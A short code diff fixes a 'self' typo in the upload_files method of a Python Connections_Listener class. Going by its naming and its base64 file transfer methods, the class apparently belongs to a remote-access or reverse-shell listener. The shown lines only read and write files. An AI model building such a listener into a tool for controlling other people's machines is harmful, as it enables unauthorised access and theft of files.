@@ -44,7 +44,7 @@ class Connections_Listener:
             file.write(base64.b64decode(content))
             return f"[+] \"{path}\" file download successful"
     
-    def upload_files(eslf, path):
+    def upload_files(self, path):
         with open(path, 'rb') as file:
             return base64.b64encode(file.read())
     
